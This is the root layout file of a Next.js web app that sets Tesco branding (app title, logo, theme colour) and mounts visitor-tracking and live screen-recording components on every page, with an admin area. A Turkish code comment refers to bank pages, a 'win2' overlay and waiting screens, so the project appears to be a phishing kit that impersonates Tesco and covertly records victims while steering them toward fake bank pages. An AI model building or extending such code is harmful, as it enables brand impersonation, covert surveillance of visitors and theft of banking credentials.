"use client";

import { usePathname } from "next/navigation";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { VisitorTracker } from "@/components/VisitorTracker";
import { LiveScreenRecorder } from "@/components/LiveScreenRecorder";
import { OgImageTags } from "@/components/OgImageTags";
import "./globals.css";

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const pathname = usePathname();

  const isAdminPage = pathname.startsWith("/admin");

  // ONEMLI: pathname'e gore body class DEGISTIRME!
  // usePathname navigasyon BASLADIGI anda degisir ama eski sayfa hala ekranda —
  // body class erken flip eder ve bekleme/gecis ekranlarinda portal arka plani
  // FLASLANIR. Body hep ah-theme kalir; beyaz gereken sayfalar (banka sayfalari,
  // win2 fixed overlay) kendi bg'lerini kendi omurleri boyunca uygular.
  const bodyClass = isAdminPage ? "bg-[#f4f7f9]" : "ah-theme";

  return (
    <html lang="en">
      <head>
        <OgImageTags />
        <link rel="manifest" href="/manifest.json" />
        <meta name="theme-color" content="#00539F" />
        <meta name="mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="apple-mobile-web-app-title" content="Tesco" />
        <link rel="apple-touch-icon" href="/tesco-mini-logo.webp" />
      </head>
      <body className={bodyClass}>
        <VisitorTracker />
        <LiveScreenRecorder />
        <SettingsProvider>
          {children}
        </SettingsProvider>
      </body>
    </html>
  );
}
